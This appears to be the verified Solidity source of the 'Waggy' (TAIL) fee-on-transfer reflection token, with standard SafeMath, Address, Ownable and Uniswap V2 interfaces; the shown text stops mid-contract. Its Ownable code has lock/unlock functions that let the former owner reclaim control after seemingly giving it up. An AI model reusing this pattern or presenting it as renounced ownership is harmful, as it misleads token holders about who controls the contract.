['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-21\n', '*/\n', '\n', '/**\n', '   Contract features:\n', '   5% fee auto added to the liquidity pool and locked forever\n', '   4% fee auto distributed to all holders\n', '   1% fee sent to charity wallet\n', ' */\n', '\n', 'pragma solidity ^0.6.12;\n', '// SPDX-License-Identifier: Unlicensed\n', 'interface IERC20 {\n', '\t\n', '\tfunction totalSupply() external view returns (uint256);\n', '\t\n', '\t/**\n', '\t * @dev Returns the amount of tokens owned by `account`.\n', '\t */\n', '\tfunction balanceOf(address account) external view returns (uint256);\n', '\t\n', '\t/**\n', "\t * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '\t *\n', '\t * Returns a boolean value indicating whether the operation succeeded.\n', '\t *\n', '\t * Emits a {Transfer} event.\n', '\t */\n', '\tfunction transfer(address recipient, uint256 amount) external returns (bool);\n', '\t\n', '\t/**\n', '\t * @dev Returns the remaining number of tokens that `spender` will be\n', '\t * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '\t * zero by default.\n', '\t *\n', '\t * This value changes when {approve} or {transferFrom} are called.\n', '\t */\n', '\tfunction allowance(address owner, address spender) external view returns (uint256);\n', '\t\n', '\t/**\n', "\t * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '\t *\n', '\t * Returns a boolean value indicating whether the operation succeeded.\n', '\t *\n', '\t * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '\t * that someone may use both the old and the new allowance by unfortunate\n', '\t * transaction ordering. One possible solution to mitigate this race\n', "\t * condition is to first reduce the spender's allowance to 0 and set the\n", '\t * desired value afterwards:\n', '\t * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '\t *\n', '\t * Emits an {Approval} event.\n', '\t */\n', '\tfunction approve(address spender, uint256 amount) external returns (bool);\n', '\t\n', '\t/**\n', '\t * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "\t * allowance mechanism. `amount` is then deducted from the caller's\n", '\t * allowance.\n', '\t *\n', '\t * Returns a boolean value indicating whether the operation succeeded.\n', '\t *\n', '\t * Emits a {Transfer} event.\n', '\t */\n', '\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '\t\n', '\t/**\n', '\t * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '\t * another (`to`).\n', '\t *\n', '\t * Note that `value` may be zero.\n', '\t */\n', '\tevent Transfer(address indexed from, address indexed to, uint256 value);\n', '\t\n', '\t/**\n', '\t * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '\t * a call to {approve}. `value` is the new allowance.\n', '\t */\n', '\tevent Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', '\n', '\n', '/**\n', " * @dev Wrappers over Solidity's arithmetic operations with added overflow\n", ' * checks.\n', ' *\n', ' * Arithmetic operations in Solidity wrap on overflow. This can easily result\n', ' * in bugs, because programmers usually assume that an overflow raises an\n', ' * error, which is the standard behavior in high level programming languages.\n', ' * `SafeMath` restores this intuition by reverting the transaction when an\n', ' * operation overflows.\n', ' *\n', ' * Using this library instead of the unchecked operations eliminates an entire\n', " * class of bugs, so it's recommended to use it always.\n", ' */\n', '\n', 'library SafeMath {\n', '\t/**\n', '\t * @dev Returns the addition of two unsigned integers, reverting on\n', '\t * overflow.\n', '\t *\n', "\t * Counterpart to Solidity's `+` operator.\n", '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - Addition cannot overflow.\n', '\t */\n', '\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '\t\tuint256 c = a + b;\n', '\t\trequire(c >= a, "SafeMath: addition overflow");\n', '\t\t\n', '\t\treturn c;\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the subtraction of two unsigned integers, reverting on\n', '\t * overflow (when the result is negative).\n', '\t *\n', "\t * Counterpart to Solidity's `-` operator.\n", '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - Subtraction cannot overflow.\n', '\t */\n', '\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '\t\treturn sub(a, b, "SafeMath: subtraction overflow");\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '\t * overflow (when the result is negative).\n', '\t *\n', "\t * Counterpart to Solidity's `-` operator.\n", '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - Subtraction cannot overflow.\n', '\t */\n', '\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '\t\trequire(b <= a, errorMessage);\n', '\t\tuint256 c = a - b;\n', '\t\t\n', '\t\treturn c;\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the multiplication of two unsigned integers, reverting on\n', '\t * overflow.\n', '\t *\n', "\t * Counterpart to Solidity's `*` operator.\n", '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - Multiplication cannot overflow.\n', '\t */\n', '\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "\t\t// Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "\t\t// benefit is lost if 'b' is also tested.\n", '\t\t// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '\t\tif (a == 0) {\n', '\t\t\treturn 0;\n', '\t\t}\n', '\t\t\n', '\t\tuint256 c = a * b;\n', '\t\trequire(c / a == b, "SafeMath: multiplication overflow");\n', '\t\t\n', '\t\treturn c;\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the integer division of two unsigned integers. Reverts on\n', '\t * division by zero. The result is rounded towards zero.\n', '\t *\n', "\t * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '\t * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '\t * uses an invalid opcode to revert (consuming all remaining gas).\n', '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - The divisor cannot be zero.\n', '\t */\n', '\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '\t\treturn div(a, b, "SafeMath: division by zero");\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '\t * division by zero. The result is rounded towards zero.\n', '\t *\n', "\t * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '\t * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '\t * uses an invalid opcode to revert (consuming all remaining gas).\n', '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - The divisor cannot be zero.\n', '\t */\n', '\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '\t\trequire(b > 0, errorMessage);\n', '\t\tuint256 c = a / b;\n', "\t\t// assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\t\t\n', '\t\treturn c;\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '\t * Reverts when dividing by zero.\n', '\t *\n', "\t * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '\t * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '\t * invalid opcode to revert (consuming all remaining gas).\n', '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - The divisor cannot be zero.\n', '\t */\n', '\tfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '\t\treturn mod(a, b, "SafeMath: modulo by zero");\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '\t * Reverts with custom message when dividing by zero.\n', '\t *\n', "\t * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '\t * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '\t * invalid opcode to revert (consuming all remaining gas).\n', '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - The divisor cannot be zero.\n', '\t */\n', '\tfunction mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '\t\trequire(b != 0, errorMessage);\n', '\t\treturn a % b;\n', '\t}\n', '}\n', '\n', 'abstract contract Context {\n', '\tfunction _msgSender() internal view virtual returns (address payable) {\n', '\t\treturn msg.sender;\n', '\t}\n', '\t\n', '\tfunction _msgData() internal view virtual returns (bytes memory) {\n', '\t\tthis;\n', '\t\t// silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '\t\treturn msg.data;\n', '\t}\n', '}\n', '\n', '\n', '/**\n', ' * @dev Collection of functions related to the address type\n', ' */\n', 'library Address {\n', '\t/**\n', '\t * @dev Returns true if `account` is a contract.\n', '\t *\n', '\t * [IMPORTANT]\n', '\t * ====\n', '\t * It is unsafe to assume that an address for which this function returns\n', '\t * false is an externally-owned account (EOA) and not a contract.\n', '\t *\n', '\t * Among others, `isContract` will return false for the following\n', '\t * types of addresses:\n', '\t *\n', '\t *  - an externally-owned account\n', '\t *  - a contract in construction\n', '\t *  - an address where a contract will be created\n', '\t *  - an address where a contract lived, but was destroyed\n', '\t * ====\n', '\t */\n', '\tfunction isContract(address account) internal view returns (bool) {\n', '\t\t// According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n', '\t\t// and  is returned\n', "\t\t// for accounts without code, i.e. `keccak256('')`\n", '\t\tbytes32 codehash;\n', '\t\tbytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '\t\t// solhint-disable-next-line no-inline-assembly\n', '\t\tassembly {codehash := extcodehash(account)}\n', '\t\treturn (codehash != accountHash && codehash != 0x0);\n', '\t}\n', '\t\n', '\t/**\n', "\t * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n", '\t * `recipient`, forwarding all available gas and reverting on errors.\n', '\t *\n', '\t * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n', '\t * of certain opcodes, possibly making contracts go over the 2300 gas limit\n', '\t * imposed by `transfer`, making them unable to receive funds via\n', '\t * `transfer`. {sendValue} removes this limitation.\n', '\t *\n', '\t * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n', '\t *\n', '\t * IMPORTANT: because control is transferred to `recipient`, care must be\n', '\t * taken to not create reentrancy vulnerabilities. Consider using\n', '\t * {ReentrancyGuard} or the\n', '\t * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n', '\t */\n', '\tfunction sendValue(address payable recipient, uint256 amount) internal {\n', '\t\trequire(address(this).balance >= amount, "Address: insufficient balance");\n', '\t\t\n', '\t\t// solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n', '\t\t(bool success,) = recipient.call{value : amount}("");\n', '\t\trequire(success, "Address: unable to send value, recipient may have reverted");\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Performs a Solidity function call using a low level `call`. A\n', '\t * plain`call` is an unsafe replacement for a function call: use this\n', '\t * function instead.\n', '\t *\n', '\t * If `target` reverts with a revert reason, it is bubbled up by this\n', '\t * function (like regular Solidity function calls).\n', '\t *\n', '\t * Returns the raw returned data. To convert to the expected return value,\n', '\t * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n', '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - `target` must be a contract.\n', '\t * - calling `target` with `data` must not revert.\n', '\t *\n', '\t * _Available since v3.1._\n', '\t */\n', '\tfunction functionCall(address target, bytes memory data) internal returns (bytes memory) {\n', '\t\treturn functionCall(target, data, "Address: low-level call failed");\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n', '\t * `errorMessage` as a fallback revert reason when `target` reverts.\n', '\t *\n', '\t * _Available since v3.1._\n', '\t */\n', '\tfunction functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n', '\t\treturn _functionCallWithValue(target, data, 0, errorMessage);\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n', '\t * but also transferring `value` wei to `target`.\n', '\t *\n', '\t * Requirements:\n', '\t *\n', '\t * - the calling contract must have an ETH balance of at least `value`.\n', '\t * - the called Solidity function must be `payable`.\n', '\t *\n', '\t * _Available since v3.1._\n', '\t */\n', '\tfunction functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n', '\t\treturn functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n', '\t * with `errorMessage` as a fallback revert reason when `target` reverts.\n', '\t *\n', '\t * _Available since v3.1._\n', '\t */\n', '\tfunction functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n', '\t\trequire(address(this).balance >= value, "Address: insufficient balance for call");\n', '\t\treturn _functionCallWithValue(target, data, value, errorMessage);\n', '\t}\n', '\t\n', '\tfunction _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n', '\t\trequire(isContract(target), "Address: call to non-contract");\n', '\t\t\n', '\t\t// solhint-disable-next-line avoid-low-level-calls\n', '\t\t(bool success, bytes memory returndata) = target.call{value : weiValue}(data);\n', '\t\tif (success) {\n', '\t\t\treturn returndata;\n', '\t\t} else {\n', '\t\t\t// Look for revert reason and bubble it up if present\n', '\t\t\tif (returndata.length > 0) {\n', '\t\t\t\t// The easiest way to bubble the revert reason is using memory via assembly\n', '\t\t\t\t\n', '\t\t\t\t// solhint-disable-next-line no-inline-assembly\n', '\t\t\t\tassembly {\n', '\t\t\t\t\tlet returndata_size := mload(returndata)\n', '\t\t\t\t\trevert(add(32, returndata), returndata_size)\n', '\t\t\t\t}\n', '\t\t\t} else {\n', '\t\t\t\trevert(errorMessage);\n', '\t\t\t}\n', '\t\t}\n', '\t}\n', '}\n', '\n', '/**\n', ' * @dev Contract module which provides a basic access control mechanism, where\n', ' * there is an account (an owner) that can be granted exclusive access to\n', ' * specific functions.\n', ' *\n', ' * By default, the owner account will be the one that deploys the contract. This\n', ' * can later be changed with {transferOwnership}.\n', ' *\n', ' * This module is used through inheritance. It will make available the modifier\n', ' * `onlyOwner`, which can be applied to your functions to restrict their use to\n', ' * the owner.\n', ' */\n', 'contract Ownable is Context {\n', '\taddress private _owner;\n', '\taddress private _previousOwner;\n', '\tuint256 private _lockTime;\n', '\t\n', '\tevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\t\n', '\t/**\n', '\t * @dev Initializes the contract setting the deployer as the initial owner.\n', '\t */\n', '\tconstructor () internal {\n', '\t\taddress msgSender = _msgSender();\n', '\t\t_owner = msgSender;\n', '\t\temit OwnershipTransferred(address(0), msgSender);\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Returns the address of the current owner.\n', '\t */\n', '\tfunction owner() public view returns (address) {\n', '\t\treturn _owner;\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Throws if called by any account other than the owner.\n', '\t */\n', '\tmodifier onlyOwner() {\n', '\t\trequire(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '\t\t_;\n', '\t}\n', '\t\n', '\t/**\n', '\t* @dev Leaves the contract without owner. It will not be possible to call\n', '\t* `onlyOwner` functions anymore. Can only be called by the current owner.\n', '\t*\n', '\t* NOTE: Renouncing ownership will leave the contract without an owner,\n', '\t* thereby removing any functionality that is only available to the owner.\n', '\t*/\n', '\tfunction renounceOwnership() public virtual onlyOwner {\n', '\t\temit OwnershipTransferred(_owner, address(0));\n', '\t\t_owner = address(0);\n', '\t}\n', '\t\n', '\t/**\n', '\t * @dev Transfers ownership of the contract to a new account (`newOwner`).\n', '\t * Can only be called by the current owner.\n', '\t */\n', '\tfunction transferOwnership(address newOwner) public virtual onlyOwner {\n', '\t\trequire(newOwner != address(0), "Ownable: new owner is the zero address");\n', '\t\temit OwnershipTransferred(_owner, newOwner);\n', '\t\t_owner = newOwner;\n', '\t}\n', '\t\n', '\tfunction geUnlockTime() public view returns (uint256) {\n', '\t\treturn _lockTime;\n', '\t}\n', '\t\n', '\t//Locks the contract for owner for the amount of time provided\n', '\tfunction lock(uint256 time) public virtual onlyOwner {\n', '\t\t_previousOwner = _owner;\n', '\t\t_owner = address(0);\n', '\t\t_lockTime = now + time;\n', '\t\temit OwnershipTransferred(_owner, address(0));\n', '\t}\n', '\t\n', '\t//Unlocks the contract for owner when _lockTime is exceeds\n', '\tfunction unlock() public virtual {\n', '\t\trequire(_previousOwner == msg.sender, "You don\'t have permission to unlock");\n', '\t\trequire(now > _lockTime, "Contract is locked until 7 days");\n', '\t\temit OwnershipTransferred(_owner, _previousOwner);\n', '\t\t_owner = _previousOwner;\n', '\t}\n', '}\n', '\n', '// pragma solidity >=0.5.0;\n', '\n', 'interface IUniswapV2Factory {\n', '\tevent PairCreated(address indexed token0, address indexed token1, address pair, uint);\n', '\t\n', '\tfunction feeTo() external view returns (address);\n', '\t\n', '\tfunction feeToSetter() external view returns (address);\n', '\t\n', '\tfunction getPair(address tokenA, address tokenB) external view returns (address pair);\n', '\t\n', '\tfunction allPairs(uint) external view returns (address pair);\n', '\t\n', '\tfunction allPairsLength() external view returns (uint);\n', '\t\n', '\tfunction createPair(address tokenA, address tokenB) external returns (address pair);\n', '\t\n', '\tfunction setFeeTo(address) external;\n', '\t\n', '\tfunction setFeeToSetter(address) external;\n', '}\n', '\n', '\n', '// pragma solidity >=0.5.0;\n', '\n', 'interface IUniswapV2Pair {\n', '\tevent Approval(address indexed owner, address indexed spender, uint value);\n', '\tevent Transfer(address indexed from, address indexed to, uint value);\n', '\t\n', '\tfunction name() external pure returns (string memory);\n', '\t\n', '\tfunction symbol() external pure returns (string memory);\n', '\t\n', '\tfunction decimals() external pure returns (uint8);\n', '\t\n', '\tfunction totalSupply() external view returns (uint);\n', '\t\n', '\tfunction balanceOf(address owner) external view returns (uint);\n', '\t\n', '\tfunction allowance(address owner, address spender) external view returns (uint);\n', '\t\n', '\tfunction approve(address spender, uint value) external returns (bool);\n', '\t\n', '\tfunction transfer(address to, uint value) external returns (bool);\n', '\t\n', '\tfunction transferFrom(address from, address to, uint value) external returns (bool);\n', '\t\n', '\tfunction DOMAIN_SEPARATOR() external view returns (bytes32);\n', '\t\n', '\tfunction PERMIT_TYPEHASH() external pure returns (bytes32);\n', '\t\n', '\tfunction nonces(address owner) external view returns (uint);\n', '\t\n', '\tfunction permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n', '\t\n', '\tevent Mint(address indexed sender, uint amount0, uint amount1);\n', '\tevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n', '\tevent Swap(\n', '\t\taddress indexed sender,\n', '\t\tuint amount0In,\n', '\t\tuint amount1In,\n', '\t\tuint amount0Out,\n', '\t\tuint amount1Out,\n', '\t\taddress indexed to\n', '\t);\n', '\tevent Sync(uint112 reserve0, uint112 reserve1);\n', '\t\n', '\tfunction MINIMUM_LIQUIDITY() external pure returns (uint);\n', '\t\n', '\tfunction factory() external view returns (address);\n', '\t\n', '\tfunction token0() external view returns (address);\n', '\t\n', '\tfunction token1() external view returns (address);\n', '\t\n', '\tfunction getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n', '\t\n', '\tfunction price0CumulativeLast() external view returns (uint);\n', '\t\n', '\tfunction price1CumulativeLast() external view returns (uint);\n', '\t\n', '\tfunction kLast() external view returns (uint);\n', '\t\n', '\tfunction mint(address to) external returns (uint liquidity);\n', '\t\n', '\tfunction burn(address to) external returns (uint amount0, uint amount1);\n', '\t\n', '\tfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n', '\t\n', '\tfunction skim(address to) external;\n', '\t\n', '\tfunction sync() external;\n', '\t\n', '\tfunction initialize(address, address) external;\n', '}\n', '\n', '// pragma solidity >=0.6.2;\n', '\n', 'interface IUniswapV2Router01 {\n', '\tfunction factory() external pure returns (address);\n', '\t\n', '\tfunction WETH() external pure returns (address);\n', '\t\n', '\tfunction addLiquidity(\n', '\t\taddress tokenA,\n', '\t\taddress tokenB,\n', '\t\tuint amountADesired,\n', '\t\tuint amountBDesired,\n', '\t\tuint amountAMin,\n', '\t\tuint amountBMin,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external returns (uint amountA, uint amountB, uint liquidity);\n', '\t\n', '\tfunction addLiquidityETH(\n', '\t\taddress token,\n', '\t\tuint amountTokenDesired,\n', '\t\tuint amountTokenMin,\n', '\t\tuint amountETHMin,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n', '\t\n', '\tfunction removeLiquidity(\n', '\t\taddress tokenA,\n', '\t\taddress tokenB,\n', '\t\tuint liquidity,\n', '\t\tuint amountAMin,\n', '\t\tuint amountBMin,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external returns (uint amountA, uint amountB);\n', '\t\n', '\tfunction removeLiquidityETH(\n', '\t\taddress token,\n', '\t\tuint liquidity,\n', '\t\tuint amountTokenMin,\n', '\t\tuint amountETHMin,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external returns (uint amountToken, uint amountETH);\n', '\t\n', '\tfunction removeLiquidityWithPermit(\n', '\t\taddress tokenA,\n', '\t\taddress tokenB,\n', '\t\tuint liquidity,\n', '\t\tuint amountAMin,\n', '\t\tuint amountBMin,\n', '\t\taddress to,\n', '\t\tuint deadline,\n', '\t\tbool approveMax, uint8 v, bytes32 r, bytes32 s\n', '\t) external returns (uint amountA, uint amountB);\n', '\t\n', '\tfunction removeLiquidityETHWithPermit(\n', '\t\taddress token,\n', '\t\tuint liquidity,\n', '\t\tuint amountTokenMin,\n', '\t\tuint amountETHMin,\n', '\t\taddress to,\n', '\t\tuint deadline,\n', '\t\tbool approveMax, uint8 v, bytes32 r, bytes32 s\n', '\t) external returns (uint amountToken, uint amountETH);\n', '\t\n', '\tfunction swapExactTokensForTokens(\n', '\t\tuint amountIn,\n', '\t\tuint amountOutMin,\n', '\t\taddress[] calldata path,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external returns (uint[] memory amounts);\n', '\t\n', '\tfunction swapTokensForExactTokens(\n', '\t\tuint amountOut,\n', '\t\tuint amountInMax,\n', '\t\taddress[] calldata path,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external returns (uint[] memory amounts);\n', '\t\n', '\tfunction swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n', '\texternal\n', '\tpayable\n', '\treturns (uint[] memory amounts);\n', '\t\n', '\tfunction swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n', '\texternal\n', '\treturns (uint[] memory amounts);\n', '\t\n', '\tfunction swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n', '\texternal\n', '\treturns (uint[] memory amounts);\n', '\t\n', '\tfunction swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n', '\texternal\n', '\tpayable\n', '\treturns (uint[] memory amounts);\n', '\t\n', '\tfunction quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n', '\t\n', '\tfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n', '\t\n', '\tfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n', '\t\n', '\tfunction getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n', '\t\n', '\tfunction getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n', '}\n', '\n', '\n', '\n', '// pragma solidity >=0.6.2;\n', '\n', 'interface IUniswapV2Router02 is IUniswapV2Router01 {\n', '\tfunction removeLiquidityETHSupportingFeeOnTransferTokens(\n', '\t\taddress token,\n', '\t\tuint liquidity,\n', '\t\tuint amountTokenMin,\n', '\t\tuint amountETHMin,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external returns (uint amountETH);\n', '\t\n', '\tfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n', '\t\taddress token,\n', '\t\tuint liquidity,\n', '\t\tuint amountTokenMin,\n', '\t\tuint amountETHMin,\n', '\t\taddress to,\n', '\t\tuint deadline,\n', '\t\tbool approveMax, uint8 v, bytes32 r, bytes32 s\n', '\t) external returns (uint amountETH);\n', '\t\n', '\tfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(\n', '\t\tuint amountIn,\n', '\t\tuint amountOutMin,\n', '\t\taddress[] calldata path,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external;\n', '\t\n', '\tfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\n', '\t\tuint amountOutMin,\n', '\t\taddress[] calldata path,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external payable;\n', '\t\n', '\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\n', '\t\tuint amountIn,\n', '\t\tuint amountOutMin,\n', '\t\taddress[] calldata path,\n', '\t\taddress to,\n', '\t\tuint deadline\n', '\t) external;\n', '}\n', '\n', '\n', 'contract Waggy is Context, IERC20, Ownable {\n', '\tusing SafeMath for uint256;\n', '\tusing Address for address;\n', '\t\n', '\tmapping(address => uint256) private _rOwned;\n', '\tmapping(address => uint256) private _tOwned;\n', '\tmapping(address => mapping(address => uint256)) private _allowances;\n', '\t\n', '\tmapping(address => bool) private _isExcludedFromFee;\n', '\t\n', '\tmapping(address => bool) private _isExcluded;\n', '\taddress[] private _excluded;\n', '\t\n', '\tuint256 private constant MAX = ~uint256(0);\n', '\tuint256 private _tTotal = 1000000000 * 10** 18;\n', '\tuint256 private _rTotal = (MAX - (MAX % _tTotal));\n', '\tuint256 private _tFeeTotal;\n', '\t\n', '\tstring private _name = "Waggy";\n', '\tstring private _symbol = "TAIL☘️";\n', '\tuint8 private _decimals = 18;\n', '\t\n', '\tuint256 public _taxFee = 4;\n', '\tuint256 private _previousTaxFee = _taxFee;\n', '\t\n', '\tuint256 public _devFee = 1; // 1% to charity wallet\n', '\tuint256 private _previousDevFee = _devFee;\n', '\taddress public charityWallet = address(0xE024Fa3a672Fb758c8E6A86e753CDC727537F1C1); \n', '\t\n', '\tuint256 public _liquidityFee = 5;\n', '\tuint256 private _previousLiquidityFee = _liquidityFee;\n', '\t\n', '\tIUniswapV2Router02 public immutable uniswapV2Router;\n', '\taddress public immutable uniswapV2Pair;\n', '\t\n', '\tbool public inSwapAndLiquify;\n', '\tbool public swapAndLiquifyEnabled = true;\n', '\t\n', '\tuint256 public _maxTxAmount = 1000000000 * 10**18;\n', '\tuint256 public numTokensSellToAddToLiquidity = 250000 * 10**18;\n', '\tuint256 public _maxWalletToken = 5000000 * 10**18;\n', '\t\n', '\tuint256 deployedAtBlock;\n', '\t\n', '\t\n', '\tevent MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);\n', '\tevent SwapAndLiquifyEnabledUpdated(bool enabled);\n', '\tevent SwapAndLiquify(\n', '\t\tuint256 tokensSwapped,\n', '\t\tuint256 ethReceived,\n', '\t\tuint256 tokensIntoLiqudity\n', '\t);\n', '\t\n', '\tmodifier lockTheSwap {\n', '\t\tinSwapAndLiquify = true;\n', '\t\t_;\n', '\t\tinSwapAndLiquify = false;\n', '\t}\n', '\t\n', '\tconstructor () public {\n', '\t\t_rOwned[_msgSender()] = _rTotal;\n', '\t\t\n', '\t\tIUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n', '\t\t// Create a uniswap pair for this new token\n', '\t\tuniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\n', '\t\t.createPair(address(this), _uniswapV2Router.WETH());\n', '\t\t\n', '\t\t// set the rest of the contract variables\n', '\t\tuniswapV2Router = _uniswapV2Router;\n', '\t\tdeployedAtBlock = block.number;\n', '\t\t\n', '\t\t//exclude owner and this contract from fee\n', '\t\t_isExcludedFromFee[owner()] = true;\n', '\t\t_isExcludedFromFee[address(this)] = true;\n', '\t\t\n', '\t\temit Transfer(address(0), _msgSender(), _tTotal);\n', '\t}\n', '\t\n', '\tfunction name() public view returns (string memory) {\n', '\t\treturn _name;\n', '\t}\n', '\t\n', '\tfunction symbol() public view returns (string memory) {\n', '\t\treturn _symbol;\n', '\t}\n', '\t\n', '\tfunction decimals() public view returns (uint8) {\n', '\t\treturn _decimals;\n', '\t}\n', '\t\n', '\tfunction totalSupply() public view override returns (uint256) {\n', '\t\treturn _tTotal;\n', '\t}\n', '\t\n', '\tfunction balanceOf(address account) public view override returns (uint256) {\n', '\t\tif (_isExcluded[account]) return _tOwned[account];\n', '\t\treturn tokenFromReflection(_rOwned[account]);\n', '\t}\n', '\t\n', '\tfunction transfer(address recipient, uint256 amount) public override returns (bool) {\n', '\t\t_transfer(_msgSender(), recipient, amount);\n', '\t\treturn true;\n', '\t}\n', '\t\n', '\tfunction allowance(address owner, address spender) public view override returns (uint256) {\n', '\t\treturn _allowances[owner][spender];\n', '\t}\n', '\t\n', '\tfunction approve(address spender, uint256 amount) public override returns (bool) {\n', '\t\t_approve(_msgSender(), spender, amount);\n', '\t\treturn true;\n', '\t}\n', '\t\n', '\tfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n', '\t\t_transfer(sender, recipient, amount);\n', '\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '\t\treturn true;\n', '\t}\n', '\t\n', '\tfunction increaseAllowance(address spender, uint256 addedValue) public virtual returns 